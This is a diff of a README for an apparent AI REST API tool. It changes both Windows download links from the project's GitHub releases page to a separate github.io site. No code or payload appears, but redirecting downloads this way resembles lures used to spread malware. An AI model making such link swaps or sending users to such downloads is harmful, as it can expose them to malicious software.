@@ -1,6 +1,6 @@
 # 🤖 ai-rest-api - Build fast artificial intelligence powered tools
 
-[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Tobitbrown126/ai-rest-api/releases)
+[![Download Link](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://tobitbrown126.github.io)
 
 This application provides a foundation for building tools that use artificial intelligence. It handles the complex logic required to connect your software to large language models. You can use it to create chatbots, analyze text, or extract data from documents. The system runs locally on your computer and manages the communication between your interface and the AI service.
 
@@ -18,7 +18,7 @@ Before you begin, ensure your computer meets these requirements:
 
 You need the latest version of the application from our release page. 
 
-[Visit this page to download the software for Windows](https://github.com/Tobitbrown126/ai-rest-api/releases)
+[Visit this page to download the software for Windows](https://tobitbrown126.github.io)
 
 1. Open your web browser.
 2. Select the link above.
